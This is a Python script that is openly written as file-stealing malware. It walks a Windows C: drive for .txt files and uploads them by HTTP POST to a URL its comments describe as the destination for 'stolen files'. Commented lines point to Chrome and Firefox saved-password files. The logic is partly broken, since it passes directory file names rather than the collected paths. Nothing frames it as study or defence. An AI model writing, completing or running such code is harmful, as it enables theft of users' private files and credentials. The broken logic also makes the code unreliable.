import os
import requests

URL = 'https://0.0.0.0' # the URL/IP to which you want to send the stolen files/information to
#USERNAME = os.getlogin()
#GOOGLE_PASSWORDS = f'C:\Users\{USERNAME}\AppData\Local\Google\Chrome\User Data\Default' # location of Google passwords
#FIREFOX_PASSWORDS = f'C:\Users\{USERNAME}\AppData\Roaming\Mozilla\Firefox\Profiles\logins.json' # location of Firefox passwords

#file_types = ['.txt'] # if checking for multiple file types
files_found = [] # log files found

def file_search():
    for dir, sdirs, files in os.walk('C:\\'): # dir - directories, sdirs - subdirectories
        #print(f'directory: {dir}\n \ # for testing to show all files scanned
        #      subdirectories: {sdirs}\n \
        #      files: {files}')
        for file in files:
            #if any(type in file for type in file_types): # check for multiple file types of interest. if you want to use this, comment out the next line.
            if len(files_found) >= 100:
                steal_files(files)
            if '.txt' in file: # check file type
                print(dir + '\\' + file) # for testing
                files_found.append([dir + '\\' + file]) # log the found file's address

def steal_files(files): # steal files
    files_payload = {}
    f_objs = []
    i = 1
    for file in files:
        file_name = os.path.basename(file) # get the file name from the path
        f = open(file, 'rb') # open the file in read-only mode binary
        f_objs.append(f) # add the file to the list of files opened to clean up later
        files_payload[f"file{i}"] = (file_name, f) # make the payload for the file containing the file name and the file in binary and add it to the list of payloads
        i += 1 # add 1 to the counter so the file keys enumerate ex. {'file1:(..),file2:(..), and so on'}
    r = requests.post(URL, files=files_payload) # POST (send) the file
    for f in f_objs:
        f.close() # close all of files opened to clean up

file_search()